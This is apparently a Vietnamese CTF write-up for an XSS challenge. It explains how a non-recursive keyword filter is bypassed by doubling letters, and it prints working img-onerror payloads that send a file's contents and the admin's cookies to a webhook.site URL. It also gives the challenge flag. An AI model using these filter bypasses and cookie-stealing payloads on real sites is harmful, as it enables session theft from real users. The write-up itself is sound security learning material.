## x ec ec 

![image](../img/2.1.png)

nhìn tên chall mình đã biết tác giả muốn làm gì ở bài này rùi, nên khá nhanh để mình xác định việc phải làm -> XSS

ứng dụng cho phép input HTML và render nó, ngoài ra còn có thêm feature `Report`
![image](../img/2.2.png)

feature `Report` sẽ được admin với account local check
![image](../img/2.3.png)

-> XSS Reflected

mình thử sai một số payload đơn giản như 
```
<script>alert(origin)</script>
javascript:alert(origin)
```
thì phát hiện bị filter đi `script, javascript:`, lúc sau mình dùng burp thì phát hiện nó filter thêm `on`

![image](../img/2.4.png)

nhưng ngay sau đó mình phát hiện ra nó không filter đệ quy, tức là nếu mình input vào `sscriptcript` thì nó sẽ return về `script`
và những gì được render sẽ nằm trên parameter `userInput`
![image](../img/2.5.png)



okey, exploit sẽ như sau:

1.input HTML cho nó render 
2.gửi link chứa parameter vừa render HTML cho admin để admin view

Chall này ban đầu mình khá mất thời gian, vì nghĩ là flag nằm ở `/flag.txt` nên cố gắng fetch nó ra webhook (khá may mắn vì server cho phép fetch ra ngoài webhook). Payload ban đầu mình dùng như sau:

```
<img src="xxx" oonnerror="fetch('/flag.txt').then(
    functioonn(respoonnse){
        return respoonnse.text()}
    ).then(
        functioonn(string){
            fetch('https://webhook.site/4b9f4c02-9e71-470b-a3f8-7e914346d4a4?flag='+encodeURI(string))
        }
    );">
```

nhưng hứng bên webhook không thấy nhả về flag, mình còn tưởng payload mình sai ở đâu đó khá lâu :<. Cũng đã thử thêm `../../../flag.txt` để xem nó có nằm trong folder sâu hơn không nhưng nohope. Sau đó mới nhận ra là có khả năng trên server không có file /flag.txt

Mình mới chuyển qua exploit cookie của admin. và đây là payload của mình:

```
<img src="x" oonnerror="fetch('https://webhook.site/4b9f4c02-9e71-470b-a3f8-7e914346d4a4?cookie=' + encodeURICompoonnent(document.cookie));">
```

gửi Report cho admin view sau đó ra webhook nhận Flag
![image](../img/2.6.png)

FLAG:`KCSC{XSS_s0_ez_c51242915de4a05d20ac3870c87a9da1}`